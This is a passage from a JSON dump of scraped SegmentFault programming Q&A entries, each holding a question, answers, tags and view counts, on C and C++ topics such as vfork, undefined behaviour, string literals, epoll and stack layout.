&gt; 0)\n        if (write(fd, buf, n) != n)\n            err_sys(\"write error\");\n\n    if (n &lt; 0)\n        err_sys(\"read error\");\n    exit(0);\n}\n\n./a.out &lt; 1.dat\nreal    0m50.386s\nuser    0m0.010s\nsys     0m0.706s\n\n如果加上O_TRUNC标志，则需要2～3min。（是因为截断文件长度需要很多时间？？）\n</code></pre>\n<p>APUE上面写ext2文件系统并不支持O_SYNC，所以设置O_SYNC与否在写文件时间基本上没区别。<br>\n我机器上文件系统是ext4，可能还是不支持O_SYNC？</br></p>\n<p>如果真的不支持，但是open(const char *pathname,O_SYNC)又显著地增加了写时间。</p>\n<p>这是为什么呢？</p>\n</div>",
      "favourite": "0",
      "glance": "2.8k",
      "tags": [
        "apue",
        "c"
      ],
      "time": "2014-03-18",
      "title": "Linux文件同步写的阻塞时间疑惑",
      "url": "https://segmentfault.com/q/1010000000439078"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000001828225\">\n<p>Look ! when use the 'return' at the end of code !You will probly see it (as the picture show)<br><img data-src=\"/img/bVhPKj\"/></br></p>\n<p>If you see those code do not help ...just let me know</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000001862910\">\n<p>摘录一段《C语言程序设计-现代方法》9.5章节</p>\n<blockquote>\n<p>return语句和exit函数之间的差异是：不管哪个函数调用exit函数都会导致程序终止，return语句仅当由main函数调用时才会导致程序终止。</p>\n</blockquote>\n<p>PS：你的代码貌似有问题(我在printf上加了计数)<br>\nprintf(\"pid=%d, glob=%d, var=%d -&gt;%d&lt;--\\n\", getpid(), glob, var, ++i);<br>\n当使用return 0的时候，运行结果是这样的：</br></br></p>\n<pre><code>... ...\nbefore vfork\npid=5101, glob=31853, var=-232083051 -&gt;31847&lt;--\nbefore vfork\npid=5101, glob=31854, var=-232083051 -&gt;31848&lt;--\nbefore vfork\npid=5101, glob=31855, var=-232083051 -&gt;31849&lt;--\nbefore vfork\n</code></pre>\n<p>然后停止了</p>\n<p>而使用exit 0时，是这样的：</p>\n<pre><code>straysh Learning]$./a.out \nbefore vfork\npid=5145, glob=7, var=4195680 -&gt;1&lt;--\n</code></pre>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000001857584\">\n<p><a href=\"http://man7.org/linux/man-pages/man2/vfork.2.html\" rel=\"nofollow\">http://man7.org/linux/man-pages/man2/vfork.2.html</a></p>\n<blockquote>\n<p>The vfork() function has the same effect as fork(2),<br>\n  except that <strong>the behavior is undefined</strong> if the process created by<br>\n  vfork() either modifies any data other than a variable of type pid_t<br>\n  used to store the return value from vfork(), or <strong>returns from the<br>\n  function in which vfork() was called</br></strong>, or calls any other function<br>\n  before successfully calling _exit(2) or one of the exec(3) family of<br>\n  functions.</br></br></br></br></br></p>\n</blockquote>\n<p>直接return是一个undefined行为. 发生core-dump是正常的.</p>\n</div>",
      "attention": "8",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000934008\">\n<p>最近读 APUE，APUE 7.3 节中说，main 函数 return 相当于</p>\n<pre><code>exit(main(argc, argv))\n</code></pre>\n<p>但是在实践程序 8-2 时候出现了问题</p>\n<p>下面的程序编译后执行会 core-dump</p>\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n\nint glob = 6;\n\nint\nmain(void)\n{\n    int var;\n    pid_t pid;\n    var = 88;\n    printf(\"before vfork\\n\");\n    if ((pid = vfork()) &lt; 0) {\n        printf(\"vfork error\");\n        exit(-1);\n    } else if (pid == 0) {\n        /* 子进程 */\n        glob++;\n        var++;\n        return 0;\n        //exit(0);\n    }\n    printf(\"pid=%d, glob=%d, var=%d\\n\", getpid(), glob, var);\n    return 0;\n    //exit(0);\n}\n</code></pre>\n<p>但是将 return 改为 exit 后却不会</p>\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n\nint glob = 6;\n\nint\nmain(void)\n{\n    int var;\n    pid_t pid;\n    var = 88;\n    printf(\"before vfork\\n\");\n    if ((pid = vfork()) &lt; 0) {\n        printf(\"vfork error\");\n        exit(-1);\n    } else if (pid == 0) {\n        /* 子进程 */\n        glob++;\n        var++;\n        //return 0;\n        exit(0);\n    }\n    printf(\"pid=%d, glob=%d, var=%d\\n\", getpid(), glob, var);\n    //return 0;\n    exit(0);\n} \n</code></pre>\n<p>请问是什么样的原因导致第一段程序会出 core-dump 呢？</p>\n</div>",
      "favourite": "3",
      "glance": "2.3k",
      "tags": [
        "c"
      ],
      "time": "2014-11-13",
      "title": "C语言里，main 函数中 return x和 exit(x) 到底有什么区别 ?",
      "url": "https://segmentfault.com/q/1010000000934008"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "5",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000002299385\">\n<p>我写的是C++</p>\n<p>我希望对一些向量按其方向排序。我用下面的struct存向量</p>\n<pre><code>struct V { double x, y };\n</code></pre>\n<p>写下面的比较函数</p>\n<pre><code>inline bool operator&lt;(const V &amp;a, const V &amp;b)\n{\n    return atan2(a.y,a.x)&lt;atan2(b.y,b.x);\n}\n</code></pre>\n<p>我把它传进std::sort里，然后排序过程中越界了。具体数据较大，不便分析。</p>\n<p>然后我把V改成下面这样，并写一个构造函数</p>\n<pre><code>struct V\n{\n    double x, y, t;\n    V(double _x, double _y) : x(_x), y(_y), t(atan2(y,x)) {}\n};\n</code></pre>\n<p>比较函数改成</p>\n<pre><code>inline bool operator&lt;(const V &amp;a, const V &amp;b)\n{\n    return a.t&lt;b.t;\n}\n</code></pre>\n<p>这样就没问题了。</p>\n<p>我原来认为atan2就算计算有误差，传相同的参数进去也应该返回相同的值。上面的情况意味着不是这样吗？还是有别的什么问题？</p>\n<h1>以下为更新内容</h1>\n<p>我又做了如下实验，更没有头绪</p>\n<p>代码：</p>\n<pre><code>#include&lt;cmath&gt;\n#include&lt;iostream&gt;\nusing namespace std;\n\nint main()\n{\n    int x=-3, y=7;\n    double tmp=atan2(y,x);\n    cout &lt;&lt; (tmp==atan2(y,x)) &lt;&lt; endl;\n    double tmp2=atan2(y,x);\n    cout &lt;&lt; (tmp==tmp2) &lt;&lt; endl;\n    return 0;\n}\n</code></pre>\n<p>输出：</p>\n<p>0<br>\n   1</br></p>\n</div>",
      "favourite": "0",
      "glance": "1.5k",
      "tags": [
        "c",
        "c++"
      ],
      "time": "2014-11-21",
      "title": "C/C++ math.h中的函数传相同参数进去返回的值一定相同吗？",
      "url": "https://segmentfault.com/q/1010000002299385"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000002434360\">\n<pre><code>a[min]^=a[i]^=a[min]^=a[i]\n</code></pre>\n<p>这句跟一句话里面使用多个自增一样，是未定义行为。简而言之就是，你在<strong>一句</strong>代码里面多次访问了<code>a[min]</code>，并做出了<strong>修改</strong>。第二次的访问使用了修改前的值还是修改后的值，不同编译器的实现不一样。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000002436591\">\n<p>我不知道那本书为什么这么说，但是我觉得大多数编译器都不是按照那本书来实现的。</p>\n<pre><code>a[min]^=a[i]^=a[min]^=a[i];\n</code></pre>\n<p>等于</p>\n<pre><code>a[min]^=(a[i]^=(a[min]^=a[i]));\n</code></pre>\n<p>等于</p>\n<pre><code>a[min] = a[min] ^ a[i]  ;\na[i]   = a[i]   ^ a[min];\na[min] = a[min] ^ a[i]  ;\n</code></pre>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000002434292\">\n<p>请把这本书<strong>扔掉</strong></p>\n<p>你可以看看微软的文档： <a href=\"http://msdn.microsoft.com/zh-cn/library/azk8zbxd.aspx\" rel=\"nofollow\">C 序列点</a><br>\n你的代码行为是未定义的</br></p>\n</div>",
      "attention": "7",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000002434095\">\n<pre><code>#include&lt;stdio.h&gt;\nint main(){\n    int a[2]={8,7};int min,i;\n    i=0,min=1;\n    a[min]^=a[i]^=a[min]^=a[i];//交换变量\n//a[i]=a[i]^a[min],a[min]=a[i]^a[min],a[i]=a[i]^a[min];\n    printf(\"%d %d \",a[i],a[min]);\n\n}   \n</code></pre>\n<p>这个代码输出是7,0<br>\n交换变量一行换成下一行的注释句运行结果是7,8；<br>\n但是这两个不是等价的么，书上说是等价的；</br></br></p>\n<pre><code>#include&lt;stdio.h&gt;\nint main(){\n    int a,b;\n    scanf(\"%d %d\",&amp;a,&amp;b);\n    a^=b^=a^=b;\n    printf(\"%d %d\",a,b);\n}\n</code></pre>\n<p>而这里面的交换变量是成功的；<br>\n为什么呢？</br></p>\n</div>",
      "favourite": "1",
      "glance": "1.7k",
      "tags": [
        "c"
      ],
      "time": "2014-12-19",
      "title": "用异或交换两个变量值的疑惑",
      "url": "https://segmentfault.com/q/1010000002434095"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000002448041\">\n<p>当一系列（一个或多个）的函数组成一个完整的模块（库）的时候，<br>\n如hash表，每个函数都是为一个对象服务的，每个函数处理完这个对象，既可以返回这个对象的指针，也可以什么都不返回，因为所有函数作用的就是这个对象本身。</br></p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000002448108\">\n<p>这种情况挺多的，比如<code>malloc</code>就是返回一个<code>void *</code>。</p>\n<p>返回指针的情形一般是：<br>\n1. 该函数在堆上分配了一段内存或者一个对象<br>\n2. 返回一个指向全局对象的（或某个全局对象的成员）的指针</br></br></p>\n<p>欢迎补充。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000002448293\">\n<p>可以用作链式表达式<br>\n像string.h里面的函数, 都是返回第一个字符串的指针</br></p>\n<pre><code>char *strcat(char *dest, const char *src);\n</code></pre>\n<p>链式表达式可以这样用</p>\n<pre><code>strcpy(strcat(s1, s2), s3);\n</code></pre>\n</div>",
      "attention": "14",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000002448012\">\n<p>除了返回函数指针之外。谢谢！</p>\n</div>",
      "favourite": "1",
      "glance": "3k",
      "tags": [
        "c"
      ],
      "time": "2014-12-27",
      "title": "C语言的函数在什么场景下需要返回一个指针？",
      "url": "https://segmentfault.com/q/1010000002448012"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000002534183\">\n<p>char str1[]=\"abcd\";<br>\nchar *str2=\"abcd\";</br></p>\n<p>str1和str2的意义是不同的。跑代码的时候，内存通常被分为堆区，栈区，代码区，全局和静态变量区，常量区等。str1是普通的字符数组，是一个变量，如果它是全局的，就放在全局和静态区；如果是它是局部的，就放在栈里。str2是个字符串指针，它指向一段字符串常量“abcd”，这段字符串常量放在常量区，不能修改。</p>\n<p>你可以把str1看成一个指针，那是因为数组名就是数组的首地址，地址就是指针，仅此而已。如果你再声明一个char *str3 = \"abcd\";你会发现str2和str3是相等的，因为它们都指向同一个字符串常量，那个常量的位置固定，str2和str3自然相等。但是如果你再声明一个char str4[] = \"abcd\"; 你会发现str1和str4不相等，原因就是这两个字符数组存储在不同的位置，str1和str4作为首地址，当然也不同。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000002533917\">\n<p>char *str2=\"abcd\";<br>\nstr2不能被修改</br></p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000002533863\">\n<p>正好StackOverflow上有一个问题是关于\"char s[] 和 char *s\"的区别：<br><a href=\"http://stackoverflow.com/questions/1704407/what-is-the-difference-between-char-s-and-char-s-in-c\" rel=\"nofollow\">http://stackoverflow.com/questions/1704407/what-is-the-difference-between-char-s-and-char-s-in-c</a></br></p>\n<p>char *s所赋值的变量，会被编译器放在内存中栈的只读数据段。对于直接用s所做的修改，会因为错误的内存访问而发生段错误。</p>\n<p>证明：<br>\n你在<code>char *str2=\"abcd\";</code>下添加一行<code>str2[0] = 'b';</code>，那一行就会发生段错误了。</br></p>\n</div>",
      "attention": "5",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000002533735\">\n<p>下面程序是用C语言写的逆置字符串，我觉得逆置函数没问题，但是传参数的不同会导致运行时的Segmentation fault (core dumped)，什么原因呢？</p>\n<pre><code>#include &lt;stdio.h&gt;\n\nvoid reverse(char *str){\n   char *end=str;\n   char tmp;\n   if(str){\n     while(*end){\n        ++end;\n     }\n     --end;\n     while(str&lt;end){\n       tmp=*str;\n       *str++=*end;\n       *end--=tmp;\n   }\n   }\n}\n\nint main()\n{\n     char str[][5]={\"abcd\",\"\",\"ab\",\"a\"};\n     int i;\n     for(i=0;i&lt;4;i++)\n     {\n     printf(\"%s\",str[i]);\n     reverse(str[i]);   //这种方式没有问题\n     printf(\"%s\\n\",str[i]);\n     }\n     char str1[]=\"abcd\";\n     char *str2=\"abcd\";\n     reverse(str1);\n     reverse(str2);   //这种方式会出现core dumped\n     printf(\"%s\\n\",str1);\n     printf(\"%s\\n\",str2);\n     return 0;\n}\n</code></pre>\n<hr>\n<p>update:感谢@spacewander的解答，后来亲自测试了下：</p>\n<pre><code>#include &lt;stdio.h&gt;\n\nvoid modify(char *str){\n    str[2]='a';\n}\nint main(){\n    char s[]=\"test\";\n    char *c=\"test\";\n    modify(s);\n    printf(\"%s\\n\",s);//正常\n    modify(c);      //core dumped\n    printf(\"%s\\n\",c);\n    return 0;\n}\n</code></pre>\n</hr></div>",
      "favourite": "0",
      "glance": "1.6k",
      "tags": [
        "c",
        "c++",
        "内存"
      ],
      "time": "2015-02-03",
      "title": "C-Segmentation fault (core dumped)",
      "url": "https://segmentfault.com/q/1010000002533735"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "4",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000002689774\">\n<p>今天尝试了下linux的epoll，使用的是默认的水平触发模式，遇到了奇怪的read阻塞问题，因为对底层不了解，一直解决不了。</p>\n<p>麻烦各位了！</p>\n<p>这是原问题的地址：<br><a href=\"http://stackoverflow.com/questions/29727210/why-does-the-read-block-in-this-caselinux-epoll\" rel=\"nofollow\">stackoverflow 问题链接</a></br></p>\n</div>",
      "favourite": "1",
      "glance": "924",
      "tags": [
        "linux",
        "unix",
        "c",
        "epoll",
        "io"
      ],
      "time": "2015-04-19",
      "title": "为什么这种情况下read()会阻塞？（Linux epoll）",
      "url": "https://segmentfault.com/q/1010000002689774"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000003917939\">\n<p>可以只用一层switch完成的</p>\n<p>只说思路：</p>\n<pre><code>if(X) {\n  A\n} elseif(Y) {\n  B\n} else {\n  C\n}</code></pre>\n<p>等价于</p>\n<pre><code>switch(true) {\n  case X:\n    A;\n    break;\n  case Y:\n    B;\n    break;\n  default:\n    C;\n    break;\n}</code></pre>\n<hr>\n<p>再来一点思路</p>\n<p>题目的嵌套if可以先转换成单层的if，然后单层的if可以按照上述方式变成单层的switch(true)，不需要case穿透</p>\n</hr></div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000003906241\">\n<pre><code>if (s &gt; 7 &amp;&amp; s &lt; 8) {\n    s = Math.floor(s);\n} else {\n    s = Math.ceil(s);\n}\nswitch (s) {\n    case 1:\n        x = 1;\n        break;\n    case 2:\n        x =3;\n        break;\n    case 3:\n    case 4:\n    case 5:\n    case 6:\n        x = 2;\n        break;\n    case 7:\n    case 8:\n        x = 1;\n        break;\n    case 9:\n    case 10:\n        x = 3;\n        break;\n    \n    default:\n        x = 0;\n        break;\n}</code></pre>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000003917746\">\n<p>首先，请允许我把题主的代码块包在一个函数里(方便测试)：</p>\n<pre><code>var org = function(s) {\n  var x;\n  if (s &gt; 0 &amp;&amp; s &lt;= 10) {\n    if (s &gt;= 3 &amp;&amp; s &lt;= 6)\n      x = 2;\n    else if (s &gt; 1 || s &lt; 8)\n      x = 3;\n    else\n      x = 1;\n  }\n  else\n    x = 0;\n  return x;\n};</code></pre>\n<p>然后大家有没有注意到，我可以把代码简化成这样：</p>\n<pre><code>var org = function(s) {\n  var x;\n  if (s &gt; 0 &amp;&amp; s &lt;= 10) {\n    if (s &gt;= 3 &amp;&amp; s &lt;= 6)\n      x = 2;\n    else\n      x = 3;\n  }\n  else\n    x = 0;\n  return x;\n};</code></pre>\n<p><code>s &gt; 1 || s &lt; 8</code>任何情况下都只能是<code>true</code><br>那么，换成<code>switch</code>的函数：</br></p>\n<pre><code>var test = function(s) {\n  var x;\n  switch (s &gt; 0 &amp;&amp; s &lt;= 10) {\n    case true:\n      switch (s &gt;= 3 &amp;&amp; s &lt;= 6) {\n        case true:\n          x = 2;\n          break;\n        default:\n          x = 3;\n          break;\n      }\n      break;\n    default:\n      x = 0;\n      break;\n  }\n  return x;\n}</code></pre>\n<p>其实都不用测试的，不过为了严谨，我还是测试过了，没问题。<br>大家也可以将这两个函数复制出来测试一下 :P</br></p>\n<p>希望能够帮助到你～ XD</p>\n<hr>\n<p>经@mcfog指点，又优化了一下，这个答案会比我之前的那个更合适：</p>\n<pre><code>var best = function(s) {\n  var x;\n  switch (true) {\n    case !(s &gt; 0 &amp;&amp; s &lt;= 10):\n      x = 0;\n      break;\n    case s &gt;= 3 &amp;&amp; s &lt;= 6:\n      x = 2;\n      break;\n    default:\n      x = 3;\n      break;\n  }\n  return x;\n}</code></pre>\n</hr></div>",
      "attention": "28",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000003906051\">\n<p>今天面试，面试官给了一道题，让把if结构转成switch</p>\n<pre><code>if(s&gt;0&amp;&amp;s&lt;=10)\n {\n     if(s&gt;=3&amp;&amp;s&lt;=6)\n         x=2;\n     else if(s&gt;1||s&lt;8)\n         x=3;\n     else\n         x=1;\n }\n else\n     x=0;</code></pre>\n<p>我的答案如下：</p>\n<pre><code> k=(s&gt;0&amp;&amp;s&lt;=10)?((s&gt;=3&amp;&amp;s&lt;=6)? 2:((s&gt;1||s&lt;8)?3:1)):0;\n switch(k)\n {\n     case 0:x=0;break;\n     case 1:x=1;break;\n     case 2:x=2;break;\n     case 3:x=3;break;\n }</code></pre>\n<p>面试官看了之后说你这个不用switch就已经做出来了呀，还用switch干啥呢，我想了想也是呀，通过三目运算就把结果求出来了，把k换成x就搞定了。<br>  我自己想了想，毫无头绪，区间划分那么乱，不能对数s整除，然后switch case。<br><strong>直接贴代码，直接贴代码，直接贴代码!</strong><br><strong>if转成switch后，不能含有if else,真想去问问面试官，这该如何实现.</strong></br></br></br></p>\n<p>思路是嵌套switch，之前一直没注意可以嵌套switch语句.</p>\n<pre><code>switch (s &gt; 0 &amp;&amp; s &lt;= 10)\n    {\n            \n        case 1:\n        switch (s &gt;= 3 &amp;&amp; s &lt;= 6)\n        {\n            case 1:\n                x = 2;\n                break;\n            default:\n                x = 3;\n                break;\n        }\n            break;\n        default:\n            x = 0;\n            break;\n    }\n</code></pre>\n</div>",
      "favourite": "11",
      "glance": "1.8k",
      "tags": [
        "c"
      ],
      "time": "2015-10-25",
      "title": "if转switch结构",
      "url": "https://segmentfault.com/q/1010000003906051"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000004692394\">\n<pre><code class=\"py\">while True:\n    pass</code></pre>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000004692931\">\n<pre><code>\"use strict\";\nconst os = require(\"os\");\nconst restMemory = 0.1;\nlet largeBuffer = [];\nwhile (true) {\n    if (parseFloat(os.freemem() / os.totalmem()) &gt; restMemory) {\n        largeBuffer.push(new Buffer(1024));\n    } else {\n        continue;\n    }\n}</code></pre>\n<p>专门为你写了一段代码，<code>nodejs</code>可以瞬间让你的内存剩余到你指定的<code>restMemory</code>值的位置。特别少的时候会很卡，小心使用。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000004695663\">\n<p>你们都说错了！！！！！！！！</p>\n<p>讲真 只要安装</p>\n<p>1.百度全家桶*<br>2.腾讯电脑管家<br>3.360安全卫士</br></br></p>\n<p>啧啧 然后重启一下电脑 尽情体验卡顿的感觉</p>\n<p>*未成年人请勿模仿 出现意外后果概不负责</p>\n<hr>\n<p>233 有人踩了一下 难道是认为百度可以提速</p>\n</hr></div>",
      "attention": "14",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000004691718\">\n<p>我是windows桌面软件的开发者，我发现了一个问题，如果windows几天不关机，在运行一些软件，会有些慢，即使用了清理释放的相关软件，也没很大作用。重启后即可消失。所以我想在开机的时候进入这种变慢环境，进行优化调试。</p>\n</div>",
      "favourite": "2",
      "glance": "1.2k",
      "tags": [
        "windows",
        "python",
        "c#",
        "c",
        "c++"
      ],
      "time": "3-26",
      "title": "如何让电脑变卡？",
      "url": "https://segmentfault.com/q/1010000004691718"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000005067857\">\n<ol>\n<li><p>从编译器的角度来解释，编译器不允许const指针赋值给非const指针，因此可知const指针不能隐式转换为非const指针。</p></li>\n<li><p>由1知，const指针q加上任意常数n，即q+n仍然为const指针类型（因为const指针允许本身发生移动或者改变，即q=q+n是允许的），而q[n]=*（q+n），因此一个const指针访问的整个数组都是不可修改的只读的值。</p></li>\n</ol>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000005060005\">\n<p>这里的Const确保函数内这个指针指向不变，始终指向数组首地址以及这个地址只读</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000005061416\">\n<p>const int 限定的是数组元素的类型，表示元素的值只读,所以是整个数组。其实 const 只是语法限定只读，实际内存数据仍然可写。  arr 还是一个指针变量，可以赋值，但只能指向 const int 类型的地址。<br>使用强制类型转换，仅为演示，不建议乱用强制转换，除非自己清楚。<br>参考代码如下：</br></br></p>\n<pre><code>void al(const int arr[])\n{\n       const int* const pci = arr;\n    arr = pci;     // 可以\n    // pci = arr;  // 不可以, 因为 const pci\n    //*pci = 3;       // 不可以, 因为 const int*\n\n    // arr[0] = 0; // 不可以\n\n    // C 可以, 编译警告\n    // C++ 不可以\n    // int *pa = arr; \n    // pa[0] = 9;  \n\n    const int *p = &amp;arr[0];\n    arr = p;\n    printf(\"arr[0]: %d\\n\", arr[0]);\n\n    const int i = 7;\n    printf(\"i: %d\\n\", i);\n    \n    void *pvi = (void *) &amp;i;\n    int  *pi  = (int *) pvi;\n    // printf(\"*pi: %d\\n\", *pi);\n    *pi = 5;\n\n    printf(\"i: %d\\n\", *pi);\n}\n  \n</code></pre>\n</div>",
      "attention": "7",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000005059738\">\n<p>1.void a(const int arr[], int n);<br>arr既然作为一个形式参数，退化为一个指针，指向数组第一个元素，那为什么const还是作用于整个数组，而不仅仅是第一个元素</br></p>\n</div>",
      "favourite": "0",
      "glance": "360",
      "tags": [
        "c",
        "c++"
      ],
      "time": "5-4",
      "title": "关于const的一个问题",
      "url": "https://segmentfault.com/q/1010000005059738"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "3",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000005865818\">\n<html><body>\n<p>如果是一个非常大的N &lt;10000000 那么计算出来的N！也是非常大的，现在只需要知道最高位的数字。<br>通过斯特林公式可以计算。<br>特林斯公式：<br><img data-src=\"/img/bVyL76\"> （公式1）<br>如下是算法：</br></img></br></br></br></p>\n<pre><code>result = 0.5* log(2*PI*(double)n)/log(10.0) + (double)n* log((double)n/E)/log(10.0);\nresult -= (int)result;\nfirst_number = exp(result * log(10.0));\n</code></pre>\n<p>以上算法代码计算通过公式表示：<br><img data-src=\"/img/bVyQWH\"> （公式2）<br>目前已知通过如下计算可以得到最高位：<br><img data-src=\"/img/bVyQXd\"> （公式3）<br>剩下的就是求N！，虽然N！可以通过特林斯计算，但是计算结果非常大。计算机直接计算会溢出结果，如下执行结果：<br><img data-src=\"/img/bVyQYb\"><br>可以看出当执行到180的时候结果都已经溢出。<br>原因应该是在计算N！ 的时候结果直接存储在计算机导致空间不足。<br>我所不明白的是为什么（公式2）的算法就可以直接计算出结果不溢出，且正确（当然数字过小的话也会有错误，比如0,1,2,3,7,8结果将不正确）。</br></br></br></img></br></br></img></br></br></img></br></p>\n</body></html>\n</div>",
      "favourite": "0",
      "glance": "152",
      "tags": [
        "c",
        "c++",
        "数学",
        "数学题"
      ],
      "time": "7-4",
      "title": "特林斯公式如何计算N！ 的最高位",
      "url": "https://segmentfault.com/q/1010000005865818"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000157122\">\n<p>“栈”这个数据结构本身并没有规定其生长的方向，具体实现中向高地址或者低地址生长都无妨。但是对于操作系统而言，栈的生长方向一般是取决于处理器对PUSH/POP操作的实现。对于x86来说，PUSH以后SP/ESP的值是减小，因此它是向低地址生长的，样例代码：</p><pre>#include &lt;stdio.h&gt;\n\nvoid stack_growth(char *function_parameter) {\n    char local;\n    if (&amp;local &gt; function_parameter)\n        printf(\"up\\n\");\n    else\n        printf(\"down\\n\");\n    printf(\"%p %p\\n\", &amp;local, function_parameter);\n}\n\nint main()\n{\n    char c = 'c';\n    stack_growth(&amp;c);\n    return 0;\n}</pre><p>而声明一个变量，无非是告诉编译器，在栈上给它准备一块空间。因此你所提及的情况，实际上与栈无直接关系：a先声明的话，就一定会<strong>先</strong>在栈上为它分配空间吗？举个最简单的栗子，如果a根本没被用到，编译器完全可以不为它分配空间。所以这个最终还是取决于编译器的实现。</p><p>补充一段WIKI吧：</p><blockquote>Some processors families, such as the x86, have special instructions for manipulating the stack of the currently executing thread. Other processor families, including PowerPC and MIPS, do not have explicit stack support, but instead rely on convention and delegate stack management to the operating system's Application Binary Interface (ABI).</blockquote>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000157105\">\n<p>系统分配的内存区叫“栈区”，手动分配的内存空间叫“堆区”。<br/>\n在“栈区”地址扩展方向是从高地址向低地址，“堆区”相反。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000157176\">\n<p>局部变量的空间不是一个一个压入栈中的，而是一次性分配好的，所以理解为变量依次入栈是错误的。C语言也没有规定局部变量在内存中的位置，只是<strong>常常</strong>实现为先定义的变量在高地址、后定义的变量在低地址。不过局部变量在栈上的位置没有绝对的关系，甚至不一定会出现在栈上。比如你的代码做这样的调整，改成下面这样：</p><pre>#include&lt;stdio.h&gt;\n\nint main()\n{\n  int a = 1;\n  int b = 2;\n\n  printf( \"a = %d, b = %d\\n\", a, b );\n  printf( \"&amp;a = %08x, &amp;b = %08x\\n\", &amp;a, &amp;b );\n  return 0;\n}</pre><p>这个时候你会发现a变量确实分配在高地址，而b变量分配在低地址。如果你把你的程序加上-O2参数优化一下，那么a和b这两个变量因为没有被真正的使用，而被编译器优化掉，你直接p &amp;a会得不到任何的值。</p>\n</div>",
      "attention": "1",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000157089\">\n<html><body>\n<p>这个问题是关于c和c++中对于参数，变量在内存中地址分配的问题。对于以下代码</p>\n<pre>int main (int argc, char *argv[]) {\n  int a;\n  int b;\n  a = 1;\n  b = 2;\n  return 0;\n}</pre>\n<p>我的理解是，main函数是通过初始函数调用，main函数实际和其他函数一样。<br>\n在初始函数调用main函数后，会先将返回地址压入堆栈，接着将参数压入堆栈。面对函数中定义的局部变量，将会按照定义顺序分配堆栈内存空间。而堆栈是从高地址向低地址生长的，所以我认为&amp;a &gt; &amp;b。<br>\n然而，在gdb调试过程中，我发现&amp;b &gt; &amp;a。请问我的理解在哪里错了?<br><img data-src=\"http://segmentfault.com/img/bVO1Q\"/></br></br></br></p>\n</body></html>\n</div>",
      "favourite": "9",
      "glance": "3.5k",
      "tags": [
        "c",
        "c++"
      ],
      "time": "2012-12-30",
      "title": "c语言中的内存分配",
      "url": "https://segmentfault.com/q/1010000000157089"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000165701\">\n<pre>int gethostbyname_r(const char *name,\n        struct hostent *ret, char *buf, size_t buflen,\n        struct hostent **result, int *h_errnop);</pre><p>为了避开非线程安全的gethostbyname，想用这货，用起来类似这样：</p><pre>int host2addr(const char *host, struct in_addr *addr) {\n    struct hostent he, *result;\n    int herr, ret, bufsz = 512;\n    char *buff = NULL;\n    do {\n        char *new_buff = (char *)realloc(buff, bufsz);\n        if (new_buff == NULL) {\n            free(buff);\n            return ENOMEM;\n        }   \n        buff = new_buff;\n        ret = gethostbyname_r(host, &amp;he, buff, bufsz, &amp;result, &amp;herr);\n        bufsz *= 2;\n    } while (ret == ERANGE);\n    if (ret == 0 &amp;&amp; result != NULL) \n        *addr = *(struct in_addr *)he.h_addr;\n    else if (result != &amp;he) \n        ret = herr;\n    free(buff);\n    return ret;\n}</pre><p>基本上跟<a href=\"http://www.gnu.org/software/libc/manual/html_node/Host-Names.html\" rel=\"nofollow\" target=\"_blank\" title=\"GNU\">GNU</a>官方文档里的例子一致（GNU的还少了个free的样子）。</p><p>但是对hostent还是不太放心：</p><pre>struct hostent {\n   char  *h_name;            /* official name of host */\n   char **h_aliases;         /* alias list */\n   int    h_addrtype;        /* host address type */\n   int    h_length;          /* length of address */\n   char **h_addr_list;       /* list of addresses */\n}\n#define h_addr h_addr_list[0] /* for backward compatibility */</pre><p>这里面有h_name，h_aliases，h_addr_list ... 我又翻看了下eglibc-2.15的gethostbyname的源码，逻辑基本上跟我上面这段一样。但是，这些东西没释放的话，真的没问题吗？</p>\n</div>",
      "favourite": "0",
      "glance": "4.1k",
      "tags": [
        "linux",
        "network",
        "c",
        "posix"
      ],
      "time": "2013-01-27",
